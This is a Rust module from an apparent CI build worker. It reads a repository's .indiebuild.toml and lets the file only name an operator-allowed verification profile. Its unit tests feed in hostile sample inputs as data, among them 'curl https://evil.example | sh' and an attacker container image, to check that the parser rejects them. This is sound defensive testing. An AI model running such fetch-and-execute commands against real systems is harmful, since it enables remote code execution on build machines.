//! Per-repository `.indiebuild.toml`.
//!
//! A repository may say *which* verification it wants, by naming one of the
//! fixed, operator-reviewed profiles. It may not say what that verification
//! does: no commands, no runner images, no mounts. That boundary is the whole
//! security model here, because the file is fetched from the commit under test
//! and is therefore attacker-controlled on any pull request.
//!
//! Selecting a profile the operator has not allowed fails the job loudly
//! rather than silently falling back, so a repository cannot quietly opt out
//! of verification by naming something unavailable.

use std::path::Path;

use serde::Deserialize;
use tokio::fs;

use crate::config::Config;
use crate::profiles::{self, ProfileSpec};

pub(crate) const CONFIG_FILE: &str = ".indiebuild.toml";

/// A `.indiebuild.toml` limit: this file is a few keys, never a payload.
const MAX_CONFIG_BYTES: u64 = 64 * 1024;

#[derive(Debug, Default, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub(crate) struct RepoConfig {
    /// Name of a fixed profile, e.g. "rust-verify".
    pub profile: Option<String>,
}

pub(crate) fn parse(contents: &str) -> Result<RepoConfig, String> {
    toml::from_str::<RepoConfig>(contents)
        .map_err(|error| format!("{CONFIG_FILE} is not valid: {error}"))
}

/// Read the file from a cloned repository, if it has one.
pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> {
    let path = repo_dir.join(CONFIG_FILE);
    let metadata = match fs::metadata(&path).await {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(format!("failed to stat {CONFIG_FILE}: {error}")),
    };
    // A symlink would be followed out of the repository; a directory or a huge
    // file is not a config either.
    if !metadata.is_file() {
        return Err(format!("{CONFIG_FILE} is not a regular file"));
    }
    if metadata.len() > MAX_CONFIG_BYTES {
        return Err(format!("{CONFIG_FILE} is larger than {MAX_CONFIG_BYTES} bytes"));
    }
    let contents = fs::read_to_string(&path)
        .await
        .map_err(|error| format!("failed to read {CONFIG_FILE}: {error}"))?;
    parse(&contents).map(Some)
}

/// Resolve which profile actually runs.
///
/// The repository's choice wins when it names a profile the operator allows;
/// otherwise the job fails rather than running something the repository did
/// not ask for.
pub(crate) fn select_profile(
    config: &Config,
    repo_config: Option<&RepoConfig>,
    requested: &'static ProfileSpec,
) -> Result<&'static ProfileSpec, String> {
    let Some(name) = repo_config.and_then(|value| value.profile.as_deref()) else {
        return Ok(requested);
    };
    let name = name.trim();
    if name.is_empty() {
        return Err(format!("{CONFIG_FILE} names an empty profile"));
    }
    if name == requested.name {
        return Ok(requested);
    }
    let Some(selected) = profiles::find(name) else {
        return Err(format!(
            "{CONFIG_FILE} selects profile {name:?}, which is not installed"
        ));
    };
    if !config.allowed_profiles.contains(selected.name) {
        return Err(format!(
            "{CONFIG_FILE} selects profile {name:?}, which this worker does not allow"
        ));
    }
    Ok(selected)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config(allowed: &[&str]) -> Config {
        let mut config = crate::config::config_from_env();
        config.allowed_profiles = allowed.iter().map(|name| (*name).to_string()).collect();
        config
    }

    fn rust_verify() -> &'static ProfileSpec {
        profiles::find("rust-verify").expect("rust-verify is installed")
    }

    #[test]
    fn a_repository_may_select_an_allowed_profile() {
        let parsed = parse("profile = \"node-verify\"").expect("parses");
        let selected = select_profile(
            &test_config(&["rust-verify", "node-verify"]),
            Some(&parsed),
            rust_verify(),
        )
        .expect("selection allowed");
        assert_eq!(selected.name, "node-verify");
    }

    #[test]
    fn no_config_keeps_the_requested_profile() {
        let selected =
            select_profile(&test_config(&["rust-verify"]), None, rust_verify()).expect("default");
        assert_eq!(selected.name, "rust-verify");

        // Present but silent on profile is the same as absent.
        let empty = parse("").expect("empty parses");
        let selected = select_profile(&test_config(&["rust-verify"]), Some(&empty), rust_verify())
            .expect("default");
        assert_eq!(selected.name, "rust-verify");
    }

    #[test]
    fn a_repository_cannot_select_a_profile_the_operator_disallows() {
        let parsed = parse("profile = \"node-verify\"").expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("must not run a disallowed profile");
        assert!(error.contains("does not allow"), "{error}");
    }

    #[test]
    fn unknown_profiles_fail_loudly_instead_of_falling_back() {
        let parsed = parse("profile = \"curl-attacker-sh\"").expect("parses");
        let error = select_profile(
            &test_config(&["rust-verify", "node-verify"]),
            Some(&parsed),
            rust_verify(),
        )
        .expect_err("unknown profile must fail");
        assert!(error.contains("not installed"), "{error}");
    }

    #[test]
    fn the_file_cannot_smuggle_commands_or_images() {
        // The whole security boundary: a repository names a profile, it never
        // describes one. Unknown keys are rejected outright.
        for hostile in [
            "image = \"attacker/evil:latest\"",
            "script = \"curl https://evil.example | sh\"",
            "profile = \"rust-verify\"\ncommand = \"id\"",
            "[[steps]]\nimage = \"x\"\nscript = \"y\"",
        ] {
            assert!(
                parse(hostile).is_err(),
                "must reject unknown keys: {hostile}"
            );
        }
    }

    #[test]
    fn an_empty_profile_name_is_an_error_not_a_default() {
        let parsed = parse("profile = \"   \"").expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("blank must not silently pass");
        assert!(error.contains("empty profile"), "{error}");
    }
}
